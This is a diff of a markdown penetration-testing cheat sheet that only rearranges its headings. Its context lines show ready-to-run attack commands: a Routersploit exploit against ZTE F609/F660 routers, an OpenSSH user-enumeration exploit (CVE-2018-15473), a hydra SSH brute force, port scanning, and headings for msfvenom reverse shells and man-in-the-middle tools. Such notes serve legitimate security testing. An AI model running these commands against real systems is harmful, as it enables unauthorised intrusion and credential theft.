@@ -50,10 +50,8 @@ Live Running Log
 tail -f ./access.log
 ```
 
-# Routersploit
 ## Routersploit
 Exploit For Router HGU, Mikrotik, IPCAM, etc.
----
 Source : https://github.com/threat9/routersploit
 ---
 Case Router ZTE_F609 and ZTE_F660
@@ -75,7 +73,6 @@ set target [IP_TARGET]
 exploit
 ```
 
-# Scanning
 ## Scanning Port and Service
 NMAP
 ```
@@ -91,8 +88,7 @@ Nbtscan
 nbtscan [NETWORK_IP]
 ```
 
-# Brute Force SSH (OpenSSH 2.3 < 7.7)
-## Brute Force CVE-2018-15473
+## Brute Force CVE-2018-15473 (OpenSSH 2.3 < 7.7)
 Source : https://www.exploit-db.com/exploits/45233
 Running Exploit 
 ```
@@ -100,7 +96,6 @@ python3 45233.py --userList user.txt [IP_TARGET] --outputFile hasil.txt
 hydra -L user.txt -P pass.txt [IP_TARGET] ssh
 ```
 
-# Metasploit
 ## Payload Msvenom
 Payload Reverse Shell
 
@@ -117,7 +112,7 @@ Payload Reverse Shell
 
 ## Meterpreter
 
-# MITM (Man In The Middle)
+## MITM (Man In The Middle)
 ## Ethercap
 ## SSLStrip
 
